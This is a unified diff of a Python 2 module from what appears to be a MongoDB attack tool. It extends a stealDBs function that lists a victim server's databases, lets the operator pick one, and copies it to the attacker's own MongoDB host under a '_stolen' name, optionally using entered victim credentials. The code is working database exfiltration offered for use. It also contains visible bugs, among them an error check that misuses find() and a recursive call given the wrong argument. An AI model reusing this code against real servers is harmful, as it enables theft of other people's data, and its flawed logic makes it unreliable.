@@ -1,5 +1,9 @@
 import pymongo
 
+global yes_tag
+global no_tag
+yes_tag = ['y','Y']
+no_tag = ['n','N']
 
 def netAttacks(target, dbPort, myIP, myPort):
     print "DB access attacks(mongoDB)"
@@ -63,7 +67,7 @@ def stealDBs(myDBIP,victim,mongoConn):
         print "Can't get a list of databases to steal.  The provided credentials may not have rights."
         return
     for dbname in dbList:
-        print str(menuItem) + "_" + dbname
+        print str(menuItem) + "-" + dbname
         menuItem += 1
     while dbLoot:
         dbLoot = raw_input("Select a database to steal:")
@@ -71,6 +75,38 @@ def stealDBs(myDBIP,victim,mongoConn):
             print "Invalid selection."
         else:
             break
+    try:
+        dbNeedCreds = raw_input("Does this Database require credentials.(y/n)?")
+        myDBConn = pymongo.MongoClient(myDBIP, 27017)
+        if dbNeedCreds in no_tag:
+
+            myDBConn.copy_database(dbList[dbLoot-1],dbList[dbLoot-1] + "_stolen",victim)
+        elif dbNeedCreds in yes_tag:
+            dbUser = raw_input("Enter database username:")
+            dbPass = raw_input("Enter database password:")
+            myDBConn.copy_database(dbList[dbLoot-1],dbList[dbLoot-1] + "_stolen",victim,dbUser,dbPass)
+        else:
+            raw_input("Invalid Selection. Press enter to continue!")
+            stealDBs(myDBConn,victim,mongoConn)
+        cloneAnother = raw_input("Database cloned. Copy another (y/n)?")
+
+        if cloneAnother in yes_tag:
+            stealDBs(myDBIP,victim,mongoConn)
+        else:
+            return
+    except Exception, e:
+        print str(e)
+        if str(e).find('text search not enabled'):
+            raw_input(
+                "Database copied, but text indexing was not enabled on the target.  Indexes not moved.  Press enter to return...")
+            return
+        elif str(e).find('Network is unreachable') != -1:
+            raw_input("Are you sure your network is unreachable? Press enter to return..")
+        else:# this part should also have other error reason not only the "Are you sure your MongoDB is running and options are set?"
+            raw_input(
+                "Something went wrong.  Are you sure your MongoDB is running and options are set? Press enter to return...")
+            return
+
 
 
 def getPlatInfo (mongoConn):
